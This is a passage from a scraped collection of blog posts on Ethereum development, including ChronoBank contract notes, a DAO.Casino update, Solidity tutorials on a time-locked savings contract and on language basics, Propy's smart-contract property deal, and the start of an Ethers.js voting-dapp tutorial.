TimeHolder\u2019s deposits\u200a\u2014\u200athis will unlock an access to notifications about deposit/withdrawal actions made by the user.PollManager (VotingManager.sol is under construction)Main contracts:vote/PollManager.sol.This piece of functionality takes place in the system and is responsible for voting functions. It serves as a central point to enter and manage (create, navigate, stop) polls.In general, it aggregates the following functions:creation of new polls,tracking the number of currently active polls,getting paginated lists of all created polls.Users, who have TIME deposits, allowed to perform a vote connected actions according to TIME deposit value.ExchangeManagerMain contracts:exchange/ExchangeManager.sol.It\u2019s an exchange registry that holds information about created exchanges and provides some utility methods for managing them.It serves as the entry point for creating new exchanges.Standalone Exchange allows users to buy/sell assigned ERC20 token for ether, as long as there is available supply.Contract owner maintains sufficient token and ether supply, and sets buy/sell prices. In order to be able to sell tokens, the user needs to create an allowance for this contract, using standard ERC20 approve() function, so that an exchange could take tokens from the user when the user orders a sell.CBE users are permitted to manage fee value against which an exchange will calculate the fee.Some methods might take a fee in TIME tokens.PlatformsManagerMain contracts:assets/PlatformsManager.sol.Managing system\u2019s and users\u2019 platforms is possible because of this contract. It allows to create and manipulate platforms and considered as an entry point to go through user\u2019s platforms.Provides system-wide ability to manage user\u2019s platforms. This contract allows to:create a brand new platform,get a list of platforms owned by a user,attach (or detach) any platforms outside the system or created somewhere by users themselves.Some methods could require paying additional fee in TIME tokens during their invocationPlatformTokenExtensionGatewayManagerMain contracts:assets/extensions/PlatformTokenExtensionGatewayManager.solThat is a backend contract specifically created to aggregate main functionality for token manipulations and make less burden on a token creation process as well as on other functions.Key responsibilities are to:create assets (with and without fee),create token crowdsale and remove them.Some methods might take a fee in TIME tokens.Dev notes: Since this contract is designed to be used by delegatecall it doesn\u2019t inherit from any contract (except FeatureFeeAdapter) and you should be careful when a need will arise to add more functionality by inheritance because the contract uses storage layout from TokenExtensionRouter and it should be preserved.WalletMain contracts:wallet/WalletsManager.sol,wallet/Wallet.sol.Allows to manage multisignature wallets, i.e.create wallet;add wallet;remove wallet.DocumentationFor more details please refer to chronobank.github.io.Stay tuned, guys! And, as always, thanks for your support!For all latest updates:Follow us on Twitter and FacebookJoin us on Telegram and SlackTIME is trading on the following exchanges:https://coinmarketcap.com/assets/chronobank/#markets", "responses": ""}, {"title": "Dao.Casino Dev Update\u200a\u2014\u200aMay 15th 2018: Games\u00a0Release", "author_name": "DAO.Casino Team", "link": "https://medium.com/@dao.casino/dao-casino-dev-update-may-15th-2018-games-release-7f2b2616061a?source=search_post", "post_date": "May 16, 2018", "readtime": "3 min read", "upvotes": "247", "content": "Dao.Casino Dev Update\u200a\u2014\u200aMay 15th 2018: Games\u00a0ReleaseDAO.Casino TeamBlockedUnblockFollowFollowingMay 16, 2018Dear community! This development update we want to concentrate your attention on last conference that DAO.Casino have participated. It was very important event, since we took part in forming crypto-games developers community and performed a very interested presentation by our lead solidity developer Alexander Davydov. The details will be further.Roadmap UpdateBusiness DevelopmentConference and communityAs we mentioned before, we will concentrate on business development this time, since it is crucial for further development of our project. We have participated in first crypto-games conference in Kyiv, 11th May. There was around 300 participants, 30 top speakers from 15 countries. This was an important step in forming blockchain games developers community, and DAO.Casino took a really important role in forming this community.Alexander Davydov\u00a0speechWe are now establishing a telegram group, which will include representatives of 67 gamedev teams\u200a\u2014\u200acommunity will use telegram as a primary interactions tool. But why it is so important for our project? We are building an ecosystem for gaming industry, and game developers are important part of such system. They will create games based on our protocol and casino operators could use this games on their platform. That is why it is so important to be in contact with our future possible partners.SlotsWhat is really worth noticing, is that we have finally presented our slots game\u200a\u2014\u200aICOSlot. Last three months we have put a lot of efforts in building this game. It was a tough challenge and we are proud to say we succeeded. We have demonstrated this game on our booth\u200a\u2014\u200aand all visitors were excited with this. Game was completely compatible with our protocol, channels opened and closed correctly, dispute worked well, all data was written to Ethereum blockchain.Slots Game developed on DAO.Casino\u2019s ProtocolThis was a ready-to-go show-case for DAO.Casino, an important release of first version of our project. And we are not going to stop on this. We showed results, proved our work. We are going to release more games, that are going to be an examples and templates for our partners of how to create blockchain games. It is going to be Dice, lottery and other games.Right now we can only show videos and screenshots of our slots. But as soon, as our new design for platform will be ready, all of our community could check it out.PresentationOur lead blockchain developer Alexander Davydov was one of conference speakers. He did the best he can\u200a\u2014\u200apresented top tier off-chain technologies. This is what our project really good at. But if you want to find more from his presentation, check the script from our github.Contacts and partnershipsEach conference and meetup is valuable for networking and possible partnership contacts. We have managed to collect a lot of such contacts and now in active negotiating phase\u200a\u2014\u200adeciding who can be valuable for DAO.Casino and who not. It will take some time to parse all business cards and connections and if we will decide to announce an agreement\u200a\u2014\u200aour community will certainly find it out first.Alexa Fetisova explaining our protocol structureDevelopment PortalWe have also presented our special web page for developers on conference. We will use it to gather dev teams in one place, help them with DAO.Casino protocol integration with our tech support and feedback. Just as we mentioned before, we need more developers that will create games based on our protocol. This page will explain, what benefits our project gives, how to create games, give them a support in difficult questions and in future it will contain guidelines of connecting our protocol to exciting games.DAO.Casino Essential LinksWebsite: https://dao.casinoDevelopment portal\u00a0: https://dao.casino/gamedev/Prototype: https://platform.dao.casino GitHub: https://github.com/daocasinoEmail: team@dao.casinoFacebook: https://www.facebook.com/Dao.casino/Twitter: https://twitter.com/daocasinoBlog: https://medium.com/@dao.casino/YouTube: https://www.youtube.com/channel/UCkggi9VnPJ0qUzfj7h70-pQ", "responses": "1"}, {"title": "Decide on dinner with an Ethereum arbitration contract", "author_name": "paul christophe", "link": "https://hackernoon.com/decide-on-dinner-with-an-ethereum-arbitration-contract-c59c13a28d5?source=search_post", "post_date": "Nov 28, 2017", "readtime": "6 min read", "upvotes": "76", "content": "Decide on dinner with an Ethereum arbitration contractpaul christopheBlockedUnblockFollowFollowingNov 28, 2017Jack and Jill can\u2019t decide on dinner so they\u2019re bringing in an arbiter to hear their dispute. The problem is they don\u2019t trust the other to independently choose an arbiter.Let\u2019s write an Ethereum contract to handle their dispute!This article assumes you have a basic understanding of Ethereum. If you\u2019re still shaky, start with this fantastic article by Preethi Kasireddy.", "responses": ""}, {"title": "Making a time savings contract in\u00a0Ethereum", "author_name": "Keno Leon", "link": "https://medium.com/coinmonks/making-a-time-savings-contract-in-ethereum-b89cacfdfe4e?source=search_post", "post_date": "Dec 15, 2017", "readtime": "5 min read", "upvotes": "103", "content": "Making a time savings contract in\u00a0EthereumOr a modern day Ulysses and the\u00a0sirens.Keno LeonBlockedUnblockFollowFollowingDec 15, 2017Legend has it that Ulysses really wanted to hear some sirens sing, unfortunately they had a tendency to convince the captains and crews of passing ships to steer their vessels into some rocks\u2026 and collect their skulls. Ulysses solution to this problem was to command his crewmen to tie him to the mast so he could enjoy the concert, ( importantly he also instructed them to cover their ears)\u00a0.Savings accounts present you with a similar problem, let\u2019s say you have some money left from your paycheck in your checking account, you might want to save it for a rainy day or an important future event, but there are sirens everywhere in the form of shinny things you want to spend your money on, so most savings accounts and instruments don\u2019t allow you to withdraw your money after a certain date, they effectively tie you to the mast.We don\u2019t yet have a cryptocurrency bank that offers traditional savings since well, they don\u2019t pay interests, and it\u2019s a descentralized currency,so in the spirit of be \u201c your own bank\u2122 \u201d you can make the best next thing, a contract that will tie you to the mast and lock your Ether for a period of time, I\u2019ll go over the uses & logic later, for now let\u2019s get down to it:The Problem / challenge\u00a0:Create a contract that locks your funds ( Ether in this case ) and then releses them after a certain time period.The contract\u00a0:pragma solidity ^ 0.4.0;contract DateTime {        function getYear(uint timestamp) public constant returns (uint16);        function getMonth(uint timestamp) public constant returns (uint8);        function getDay(uint timestamp) public constant returns (uint8);}contract FuturePayable {address private owner;  uint public bday;  uint public payday;address public dateTimeAddr = 0x8Fc065565E3e44aef229F1D06aac009D6A524e82;  DateTime dateTime = DateTime(dateTimeAddr);modifier onlyOwner {    require(msg.sender == owner);    _;  }/*constructor*/  function FuturePayable() public  {    owner = msg.sender;    bday = now;    payday = ( bday + 1 days );  }/* Default function */  function() public payable {  }function withdraw() public onlyOwner {       require (block.timestamp > payday);       msg.sender.transfer(this.balance);   }function getBirthYear() view public returns (uint16){      return dateTime.getYear(bday);  }function getBirthMonth() view public returns (uint8){      return dateTime.getMonth(bday);  }function getBirthDay() view public returns (uint8){      return dateTime.getDay(bday);  }function getPayYear() view public returns (uint16){      return dateTime.getYear(payday);  }function getPayMonth() view public returns (uint8){      return dateTime.getMonth(payday);  }function getPayDay() view public returns (uint8){      return dateTime.getDay(payday);  }}Deploying:Contract Address:0x192c0509fb52ea771bbfc6c99f4aa48b181be9e6https://kovan.etherscan.io/address/0x192c0509fb52ea771bbfc6c99f4aa48b181be9e6We will also send some Ether ( 1 ETH )\u00a0:After adding the contract to Parity\u2026If we then try to immediately withdraw, Parity will warn you not to go ahead.But if you do send the transaction, the contract will throw since it\u2019s not ready yet, and you loose a bit of gas\u2026We need to wait for one whole day to retrieve our Ether, we will use that time to explain the contract:function FuturePayable() public  {    owner = msg.sender;    bday = now;    payday = ( bday + 1 days );  }The constructor upon creation sets the relevant dates, and here you can change the duration to something more relevant like 1 months 1 years it also defines an owner.The other relevant bit is this one:function withdraw() public onlyOwner {       require (block.timestamp > payday);       msg.sender.transfer(this.balance);}The first thing to note is that we are checking for ownership via the onlyOwner modifier, we then check that the date is correct with block.timestamp > payday and if so we then send the whole contracts balance upon being called, that\u2019s it.The rest of the contract just adds a payable function and some convenience date getters I covered previously here:https://medium.com/@k3no/making-a-birthday-contract-858fd3f63618A note about working with Timestamps:Our contracts birthday is 1513212652 in Timestamp format.It can also be consulted in human readable form straight from the contract thanks to the use of a Time Date library:getBirthDay    14getBirthMonth    12getBirthYear    2017The gotcha here is that the timestamp has a fixed time zone (UTC), so you would still need to convert it to your local time zone for it to make sense to you or your users.So a day has passed and now is time to call the contract again\u2026This results in the owner account ( K3NOKOVAN ) receiveing (0.99 Ether, see note ) and the contracts balance going back to zero as intended, you can check the tx history for details:https://kovan.etherscan.io/address/0x192c0509fb52ea771bbfc6c99f4aa48b181be9e6Important Note: There are 2 transactions and thus 2 types of fees, the first one originated from the owner account calling the withdraw function:https://kovan.etherscan.io/tx/0xfe63a3a5e22d3a0b505e1157de43dcd5c1912990fabd8fac13268a16336d9343It consumed 30054 wei in Gas.The second one is the one generated by this calls transfer, and it is called an Internal Transaction :https://kovan.etherscan.io/tx/0xfe63a3a5e22d3a0b505e1157de43dcd5c1912990fabd8fac13268a16336d9343#internalIt consumed around 2300 wei in Gas (the limit or stipend for transfers). Both transaction fees were paid by the originating contract (the owner)If you are transferring to the same account from where you are calling, your fees and deposit might be added in parity or other wallets,this is why you might get 0.99 ETH, and not 1 full ETH. Uses.Well, the obvious one is to lock your Ether for a time period, you might want to buy and hodl some Ether for a few months expecting that the price rises, but don\u2019t trust yourself you won\u2019t spend it in some crypto kittens instead, or worse panic sell.Other uses could be financial instruments, escrow services and future contracts.Improving it.While a working example, this is by no means the final word in time savings contracts, a number of improvements could be made, adding an automatic withdrawal, clearer finer date information, make it killable, provide a setter for the time period to name a few.Thanks for reading\u00a0!Shameless plug: If you are looking for an introduction to Ethereum, Solidity and Smart Contracts I just published an eBook ( and soon a print one ) on getting started:https://www.amazon.com/dp/B078CQ8L7VAbout the Author\u00a0:Born Eugenio Noyola Leon (Keno) I am a Designer,Web Developer/programmer, Artist and Inventor, currently living in Mexico City, you can find me at www.k3no.com", "responses": ""}, {"title": "Writing Software Contracts for Ethereum\u200a\u2014\u200aPart\u00a02", "author_name": "Satish Manohar Talim", "link": "https://medium.com/coinmonks/writing-software-contracts-for-ethereum-part-2-cfcfae70a20c?source=search_post", "post_date": "Aug 3, 2017", "readtime": "8 min read", "upvotes": "68", "content": "Writing Software Contracts for Ethereum\u200a\u2014\u200aPart\u00a02Satish Manohar TalimBlockedUnblockFollowFollowingAug 3, 2017(Updated on 3rd Feb. 2018)In Part 1 we talked about the basics of Blockchain.In Part 3 we will setup our private blockchain using geth.What are Smart Contracts?1. Smart-contracts are a way for people all across the globe to do business with each other even if they don\u2019t speak the same language or use the same currency. Smart contracts help you exchange money, property, shares, or anything of value in a transparent, conflict-free way, while avoiding the services of a middleman.2. The best way to describe smart contracts is to compare the technology to a vending machine. Ordinarily, you would go to a lawyer or a notary, pay them, and wait while you get the document. With smart contracts, you simply drop a cryptocurrency into the vending machine (i.e. ledger), and your driver\u2019s license, or whatever drops into your account. More so, smart contracts not only define the rules and penalties around an agreement in the same way that a traditional contract does, but also automatically enforce those obligations.3. Smart contracts are a series of instructions, written using the programming language \u201cSolidity\u201d, which work on the basis of the IFTTT logic aka the IF-THIS-THEN-THAT logic.4. You can use smart contracts for all sort of situations that range from financial derivatives to insurance premiums, breach contracts, property law, credit enforcement, financial services, legal processes and crowd funding agreements.Smart Contract\u200a\u2014\u200aimage courtesy BlockgeekThree companies to watch are:RSKRSK, bitcoin\u00b4s smart contract platform.www.rsk.coBalanc3Balanc3 -- a ConsenSys formation -- has been working in stealth for over a year to build out a blockchain-based\u2026www.linkedin.comMonaxBusinesses use blockchain, smart contract, and distributed storage technologies to share data, eliminate redundancy and\u2026monax.ioEthereum software: geth, eth,\u00a0pyethappThe official Ethereum clients are all open source\u200a\u2014\u200athat is you can see the code behind them, and tweak them to make your own versions. The most popular clients are:1. geth (written in a language called Go) https://github.com/ethereum/go-ethereum geth is the entry point into the Ethereum network (main-, test- or private net), capable of running as a full node (default) archive node (retaining all historical state) or a light node (retrieving data live).2. eth (written in C++) https://github.com/ethereum/cpp-ethereum3. pyethapp (written in Python) https://github.com/ethereum/pyethappThese are all command-line based programs (think green text on black backgrounds) and so additional software can be used for a nicer graphical interface.A popular Ethereum browser is the Mist browser which is fast and a secure way of interacting with the Ethereum network.The most widely used Ethereum client (geth) is written in Go, which means there should be a nice ecosystem for interacting with Ethereum and smart contracts using Go with nice features such as code-generation and reusable helpers from shared libraries. We shall explore this in the forthcoming articles.Smart Contract languages: Solidity / Serpent,\u00a0LLLThere are three common languages smart contracts are written in, which can be compiled into smart contracts and run on Ethereum Virtual Machines. They are:Solidity\u200a\u2014\u200alooks a little bit like Javascript. This is currently the most popular and functional smart contract scripting language.Serpent\u200a\u2014\u200asimilar to the language Python, and was popular in the early history of Ethereum. However, it is due for retirement soon.LLL (Lisp Like Language)\u200a\u2014\u200asimilar to Lisp and was only really used in the very early days. It is probably the hardest to write in.All the above languages can be compiled into EVM bytecode.Let\u2019s understand and start learning the Solidity\u00a0languageSolidity is a contract-oriented, high-level language whose syntax is similar to that of JavaScript and it is designed to target the Ethereum Virtual Machine (EVM).Solidity Language itself is a tool that we use to generate machine-level code that can execute on the EVM, it\u2019s a language with a compiler which takes our high-level human-readable code and breaks it down into simple instructions. Here\u2019s a list of all available opcodes.Solidity is statically typed (the type of the variable will be determined at compile time and not at run time), supports inheritance, libraries and complex user-defined types among other features.Solidity has\u00a0.sol as a file extension.To learn Solidity you don\u2019t need an Ethereum node to write and deploy smart contracts. The best way to try out Solidity for small contracts right now, is using Remix\u200a\u2014\u200aa browser-based IDE with integrated compiler and Solidity runtime environment without server-side components.A Simple Smart Contract On\u00a0EthereumLet us begin with a simple smart contract example MessageContract.sol where we learn how to write Getters and Setters in Solidity.MessageContract.solUsing RemixClick on the + button at the top\u00a0leftLoad Remix and you will see on the left side a button to load new solidity files; in the center you have the code window and on the right side you can see the control elements that has tabs for Run, Compile etc. Now click on the + button at the top left and give the name as MessageContract.sol Press OK.Copy the above code i.e. MessageContract.sol into Remix\u2019s middle window.Click on the Run button on the top right and it will show you the current environment. We will use the JavaScript VM where everything is local and in memory only. Also, you can see that it gives you several accounts for testing. Now, click on the pink colored Create button.Click on the Create button to execute your\u00a0codeYou should see a getMessage button in blue (that\u2019s the getter) and the setMessage in pink (that\u2019s the setter). Enter \u201csome text\u201d in double quotes in the setMessage text area and press the setMessage button. The new value is now set. If you press the getMessage button you should now see \u201csome text\u201d.Let us try and understand what we are doing inside the above program.Understanding Soliditypragma:Source files can (and should) be annotated with a so-called version pragma to reject being compiled with future compiler versions that might introduce incompatible changes.The version pragma is used as follows:pragma solidity ^0.4.0;Such a source file will not compile with a compiler earlier than version 0.4.0 and it will also not work on a compiler starting from version 0.5.0 (this second condition is added by using ^).Structure of a Contract:The Solidity docs say \u201cContracts in Solidity are similar to classes in object-oriented languages\u201d that resides at a specific address on the Ethereum blockchain.Each contract can contain declarations of State Variables, Functions, Function Modifiers, Events, Structs Types and Enum Types (more on these later).Furthermore, contracts can inherit from other contracts. An interesting read is related to the second biggest ETH theft of all time that was basically triggered by inheritance (via delegation).Code Layout:Indentation\u200a\u2014\u200aUse 4 spaces per indentation level.Tabs or Spaces\u200a\u2014\u200aSpaces are the preferred indentation method. Mixing tabs and spaces should be avoided.Source File Encoding\u200a\u2014\u200aUTF-8 or ASCII encoding is preferred.Comments\u200a\u2014\u200aSingle-line comments (//) and multi-line comments (/*\u2026*/) are possible.// This is a single-line comment./*This is amulti-line comment.*/Naming Conventions:Contracts and libraries should be named using the CamelCase style (CamelCase is a naming convention in which a name is formed of multiple words that are joined together as a single word with the first letter of each of the multiple words capitalized so that each word that makes up the name can easily be read. The name derives from the hump or humps that seem to appear in any CamelCase name. In UpperCamelCase, the first letter of the new word is upper case, allowing it to be easily distinguished from a lowerCamelCase name, in which the first letter of the first name is lower case.). In the code above, we have contract MessageContractFunction Names should use mixedCase (lowerCamelCase name). In the code above, we have a function getMessage()String Literals:String literals are written with either double or single-quotes, for example \u201cHello World\u201dA convention is that strings should be quoted with double-quotes instead of single-quotes.string:It\u2019s a dynamic sized unicode string assumed to be UTF-8 encoded.In Solidity one requires to mention the type of variable, in our case string message.Statement:A basic statement would setup a variable (message in our case) and give it a value. This type of a statement is called an assignment statement because it sets a value on a variable.string message = \u201cHello World\u201d;All statements must end in a semicolon (;).Functions:For short function declarations, it is recommended:for the opening brace of the function body to be kept on the same line as the function declaration.The closing brace should be at the same indentation level as the function declaration.The opening brace should be preceded by a single space.When declaring short functions with a single statement, it is permissible to do it on a single line. For example:function shortFunction() { doSomething(); }There are four types of visibilities for functions: external, public, internal or private, where the default ispublic. Do note that different visibility levels will not \u201chide\u201d your code from others, but just prevent other contracts from calling them. The visibility specifier is given after the type for state variables and between parameter list and return parameter list for functions.State Variables:There are three types of visibilities for state variables: public, internal or private, where the default is internal (these functions and state variables can only be accessed internally i.e. from within the current contract or contracts deriving from it).State variables can be declared as constant. In this case, they have to be assigned from an expression which is a constant at compile time.The compiler does not reserve a storage slot for these constant state variables, and every occurrence is replaced by the respective constant expression (which might be computed to a single value by the optimizer).Not all types for constants are implemented at this time. The only supported types are value types and strings.The visibility specifier is given after the type for state variables and between parameter list and return parameter list for functions.Note: If you make your state variables public\u200a\u2014\u200athe compiler will create getters for you automatically.ResourcesVideos:What is a Smart Contract? A Beginner\u2019s GuideWhat is a blockchain smart contract?Beginner\u2019s Guide: Smart Contracts Programming Tutorial in SolidityLinks:Style GuideCreditsThank you Michael Kohl for reviewing this article and offering suggestions. Much appreciated.", "responses": "1"}, {"title": "What Every Techie Wants To Know About The First Blockchain Transaction In The\u00a0EU", "author_name": "Propy", "link": "https://medium.com/propy/how-to-process-international-property-transactions-using-propy-and-decentralized-technologies-78d7239a2a54?source=search_post", "post_date": "Oct 31, 2018", "readtime": "6 min read", "upvotes": "138", "content": "What Every Techie Wants To Know About The First Blockchain Transaction In The\u00a0EUPropyBlockedUnblockFollowFollowingOct 31, 2018Property investors want fast, easy deals for in-demand locations. Yet, until now, it\u2019s been hard for anyone to buy a property remotely. By integrating decentralized technologies like smart contracts into the real estate sales process, Propy.com removes the complications. Secure transactions can be made across borders, without the traditional long delays that frustrate buyers.Seville, Spain, is one of the hottest real estate markets in the world right now. A French buyer recently used our platform to buy a property there.How do we do it? We\u2019ll show you exactly how we use smart contracts on the Ethereum blockchain to:Make real estate deals more efficientProvide a transparent sales process that is not open to manipulationStore immutable records on the blockchain, which is more secure than traditional paper recordsWe\u2019ll share an overview of the suite of smart contracts at Propy, and go through how a deal is processed, step-by-step, from that perspective.For a broader overview of how the Propy transaction platform works, check out our video explaining the transaction platform. With our user-friendly web interface, users can complete real estate deals with no blockchain knowledge.(Note that the video describes the California workflow, so the documents and roles involved are a bit different than those for this deal in Spain)How Propy Sells Real Estate on the BlockchainEach property deal is represented by its own self-contained group of smart contracts on the Ethereum blockchain. We\u2019ve designed the system to be flexible, with contracts interacting with each other via generic interfaces that allow a lot of room for different contract implementations going forward. There are three smart contracts that make up a deal: Deed, Property, and Escrow.Deed Smart ContractDeed contracts define the terms and parties of the deal. They track the flow of events as the deal happens. The hashes of all relevant signed documents are stored here as an immutable record.Property Smart ContractProperty contracts contain metadata about the property\u2019s physical characteristics, such as its physical address and measured area. They also maintain a record of property owners and transfers of ownership.Escrow Smart ContractEscrow contracts track the flow of money. There are many potential types of escrow contracts and the process is handled slightly differently for different currencies.For example, if ETH is used for the transaction (as was the case for this Seville deal), the Escrow contract itself can hold the funds until conditions for their release have been met.For other currencies (like USD and BTC), the transfer of money happens through separate systems and the Escrow contract serves more as a record of events.The Propy\u00a0RegistryBefore going further into the flow of the deal, it\u2019s important to note how the Deed, Property, and Escrow contracts are created and managed. The Propy Registry suite of contracts is the hub that keeps track of all Deed and Property contracts, manages users and their roles (such as notary, agent, buyer, or seller), and provides a central place for interacting with all aspects of the system.The Propy Registry is made up of a significant number of components, and it\u2019s designed to be flexible and upgradable. Essentially, it\u2019s used to set up the contracts, users, and parameters for each deal.The Flow of the\u00a0DealA deal begins when a potential buyer finds a property on the Propy Listings Platform and contacts one of the agents assigned to the property. The buyer officially starts the process by sending a deposit, which reserves the property for the deal. After the buyer reserves the property, other participants get invited to close the deal and our smart contracts become involved.First, the Deed, Property, and Escrow contracts are created by the Propy Registry system. It\u2019s also possible that a Property contract already exists for the property in question. In this case, the existing Property contract would be used.As an aside, here are the Ethereum addresses of the smart contracts for this Seville deal:Deed contract: 0xc1e63555628be09bed9e1cc086c4db919bd0b68fProperty contract: 0xB8c63aeE7A399CE1729F0FfdaDEC19F4b1A8594AEscrow contract: 0x99F82dFf6e94F589A786c6063f14bCD9BFf17cA8After the contracts are created, the Deed contract is initialized with information about the parties involved (such as who the agents, buyer, and seller are), the sale price, and the required documents/signatures for the deal.The required documents/signatures for the deal are set up into a series of steps that must be progressed through in order for the deal to go through. Actions are then taken to move the deal forward through these steps. Each step requires certain conditions to be met, which includes the corresponding documents being signed and uploaded.Documents are signed using DocuSign, which is integrated into our transaction platform. Prior to signing, the paperwork is verified by the Propy legal team. In the future, we\u2019re planning to handle document signatures on an Ethereum-based platform.The hash of each document is stored in the Deed contract, which provides a verifiable record for any parties who have the original document.Currently, the documents themselves are stored by Propy. We\u2019re looking to provide a decentralized file storage solution in the future.For this deal in Seville, three of these steps were required, involving the signing & uploading of a Nota Simple (Property Registry Filing in English), a Gastos de Comunidad (HOA Fees Agreement), and the Escritura itself (Deed).Once all the required documents are signed and uploaded to the satisfaction of all parties, the buyer deposits the funding required into whatever escrow system is being used. This is recorded by the Escrow contract.At this point, we\u2019re almost ready to officially transfer ownership.Propy FeeThere is a fee to buy a property using our service. This fee is paid in PRO tokens and is divided between the Network Growth Pool wallet and the Propy wallet. The amount of tokens that will go to each is clearly defined in the Deed contract. The Network Growth Pool is used to incentivize the engagement of users in the platform in an automatic and transparently auditable way. It\u2019s also used to incentivize governments and other related institutional actors to use the platform. You can read more on cryptoeconomics and the Network Growth Pool here.To pay the fee, the buyer sends PRO tokens to the Deed contract\u2019s address. Then, the Deed contract can distribute the tokens between the two wallets as defined in its terms.Once the fee is paid, ownership of the property can be officially transferred on the blockchain. The notary who was a participant in the transaction platform and thus smart contracts records the deal to the government registry as well.Each of the three smart contracts plays a role in the ownership transfer process. The Deed contract enters a finished state and records that the deal is complete. The Escrow contract releases the funds to the seller (if the deal was done in ETH), or records that the money was transferred successfully (if the deal was done in another currency). The Property contract records the Ethereum address of the new owner.Join the Real Estate RevolutionPropy is automating real estate. We make transactions faster, simpler, and more secure. If you\u2019re a developer interested in working on global problems, get in touch. You can contact our world-class technology team on info@propy.com.Read more about the Seville blockchain property dealWritten by Thomas Spofford, Solidity Engineer at Propy", "responses": ""}, {"title": "Build an Ethereum DApp Using Ethers.js", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/build-an-ethereum-dapp-using-ethers-js-a1b1930d332?source=search_post", "post_date": "Mar 6", "readtime": "7 min read", "upvotes": "58", "content": "Build an Ethereum DApp Using Ethers.jsTutorial from Zastrin.com CEO, Mahesh\u00a0MurthyBlockChannelBlockedUnblockFollowFollowingMar 6Note: This post originally was published on the Zastrin.com blog, by Mahesh MurthyIf you have built dapps on Ethereum, you most likely have used Web3.js to build your javascript frontend. Ethers.js is a lightweight javascript library which can be used as an alternative to Web3.js to build your javascript frontend and interact with the Ethereum blockchain. I had a chance to tinker with Ethers.js recently and was impressed with it. In this post/tutorial, I show how you can use Ethers.js to build a simple dapp. I hope this helps you evaluate and get started using Ethers.js for your next project.In this tutorial, we will create a simple Voting dapp (very similar to our popular \u2018Hello world voting dapp\u2019 many of you might know!). The Solidity contract will be the same but we will use Ethers.js instead of Web3.js for the frontend. The application is extremely simple, all it does is initialize a set of candidates, let anyone vote for those candidates and display the total votes received by each candidate.If you are new to Ethereum, here are some courses that can help you get started.The goal of this tutorial is to:1. Set up the development environment2. Learn the process of writing a contract, compiling it and deploying it in your development environment3. Interact with the contract using ethers.js through a nodejs console4. Interact with the contract using ethers.js in a simple web page to display the vote counts and vote for candidates through the pageIf you have already worked through the \u2018Hello world voting dapp\u2019, you can skip to Step 3.This is how I would visualize this application we are going to build.1. Setting up the development environmentInstead of developing the app against the live blockchain, we will use an in- memory blockchain (think of it as a blockchain simulator) called ganache. Below are the steps to install ganache, ethersjs, solc (to compile our contract) and start the test blockchain on a macos. The exact same instructions work on linux as well.zastrin@macbook$ brew updatezastrin@macbook$ brew install nodejszastrin@macbook$ mkdir -p ethereum_voting_dapp/chapter1-ethersjszastrin@macbook$ cd ethereum_voting_dapp/chapter1-ethersjszastrin@macbook$ npm install ganache-cli ethers solc@0.5.3zastrin@macbook$ node_modules/.bin/ganache-cliGanache CLI v6.0.3 (ganache-core: 2.0.2)Available Accounts==================(0) 0x5c252a0c0475f9711b56ab160a1999729eccce97(1) 0x353d310bed379b2d1df3b727645e200997016ba3(2) 0xa3ddc09b5e49d654a43e161cae3f865261cabd23(3) 0xa8a188c6d97ec8cf905cc1dd1cd318e887249ec5(4) 0xc0aa5f8b79db71335dacc7cd116f357d7ecd2798(5) 0xda695959ff85f0581ca924e549567390a0034058(6) 0xd4ee63452555a87048dcfe2a039208d113323790(7) 0xc60c8a7b752d38e35e0359e25a2e0f6692b10d14(8) 0xba7ec95286334e8634e89760fab8d2ec1226bf42(9) 0x208e02303fe29be3698732e92ca32b88d80a2d36Private Keys==================(0) a6de9563d3db157ed9926a993559dc177be74a23fd88ff5776ff0505d21fed2b(1) 17f71d31360fbafbc90cad906723430e9694daed3c24e1e9e186b4e3ccf4d603(2) ad2b90ce116945c11eaf081f60976d5d1d52f721e659887fcebce5c81ee6ce99(3) 68e2288df55cbc3a13a2953508c8e0457e1e71cd8ae62f0c78c3a5c929f35430(4) 9753b05bd606e2ffc65a190420524f2efc8b16edb8489e734a607f589f0b67a8(5) 6e8e8c468cf75fd4de0406a1a32819036b9fa64163e8be5bb6f7914ac71251cc(6) c287c82e2040d271b9a4e071190715d40c0b861eb248d5a671874f3ca6d978a9(7) cec41ef9ccf6cb3007c759bf3fce8ca485239af1092065aa52b703fd04803c9d(8) c890580206f0bbea67542246d09ab4bef7eeaa22c3448dcb7253ac2414a5362a(9) eb8841a5ae34ff3f4248586e73fcb274a7f5dd2dc07b352d2c4b71132b3c73fHD Wallet==================Mnemonic: cancel better shock lady capable main crunch alcohol derive alarm duck umbrellaBase HD Path: m/44'/60'/0'/0/{account_index}Listening on localhost:8545Notice that the ganache-cli creates 10 test accounts to play with automatically. These accounts come preloaded with 100 (fake) ethers.2. Simple voting\u00a0contractWe are going to use the solidity programming language to write our contract. If you are familiar with object oriented programming, learning to write solidity contracts should be a breeze. We will write a contract (think of contract as a class in your favorite OOP language) called Voting with a constructor which initializes an array of candidates. We will write 2 methods, one to return the total votes a candidate has received and another method to increment vote count for a candidate.Note: The constructor is invoked once and only once when you deploy the contract to the blockchain. Unlike in the web world where every deploy of your code overwrites the old code, deployed code in the blockchain is immutable. i.e, If you update your contract and deploy again, the old contract will still be in the blockchain untouched along with all the data stored in it, the new deployment will create a new instance of the contract.Below is the voting contract code with inline comment explanation:Copy the above code to a file named Voting.sol in the ethereum_voting_dapp/chapter1-ethersjs directory. Now let\u2019s compile the code and deploy it to ganache blockchain. Follow the commands below to compile the contract.zastrin@macbook$ node_modules/.bin/solcjs \u2014 bin \u2014 abi Voting.solzastrin@macbook$ lsVoting.sol Voting_sol_Voting.abi Voting_sol_Voting.binWhen you compile the code successfully using the command above, the compiler outputs 2 files that are important to understand:1. Voting_sol_Voting.bin: This is the bytecode you get when the source code in Voting.sol is compiled. This is the code which will be deployed to the blockchain.2. Voting_sol_Voting.abi: This is an interface or template of the contract (called abi) which tells the contract user what methods are available in the contract. Whenever you have to interact with the contract in the future, you will need this abi definition. You can read more details about ABI hereWe will now use ethersjs library to deploy our application and interact with it.First, run the \u2018node\u2019 command in your terminal to get in to the node console and initialize the ethers object. All the code snippets below need to be typed in the node console. To compile the contract, load the bytecode and abi from the file system in to a string like shown belowzastrin@macbook$ node> ethers = require(\u2018ethers\u2019)> bytecode = fs.readFileSync(\u2018Voting_sol_Voting.bin\u2019).toString()> abi = JSON.parse(fs.readFileSync(\u2018Voting_sol_Voting.abi\u2019).toString())Next is to initialize the provider which is a generic interface to connect to the blockchain. Since we are running the blockchain locally, we will use the JsonRPCProvider to connect to it. If you wanted to connect to a real blockchain, you have many other provider options. Once connected, you can test the 